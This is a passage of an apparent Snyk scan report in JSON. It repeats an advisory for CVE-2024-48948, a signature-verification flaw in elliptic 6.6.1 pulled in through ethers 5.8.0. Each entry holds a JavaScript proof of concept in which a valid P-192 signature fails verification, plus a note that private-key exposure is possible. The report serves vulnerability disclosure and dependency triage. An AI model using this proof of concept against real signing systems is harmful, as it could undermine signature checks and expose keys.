bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/wallet@5.8.0",
          "@ethersproject/json-wallets@5.8.0",
          "@ethersproject/hdnode@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar pkPem = '-----BEGIN PUBLIC KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/hash@5.8.0",
          "@ethersproject/abstract-signer@5.8.0",
          "@ethersproject/abstract-provider@5.8.0",
          "@ethersproject/transactions@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar pkPem = '-----BEGIN PUBLIC KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/contracts@5.8.0",
          "@ethersproject/abstract-signer@5.8.0",
          "@ethersproject/abstract-provider@5.8.0",
          "@ethersproject/transactions@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar pkPem = '-----BEGIN PUBLIC KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/hdnode@5.8.0",
          "@ethersproject/abstract-signer@5.8.0",
          "@ethersproject/abstract-provider@5.8.0",
          "@ethersproject/transactions@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
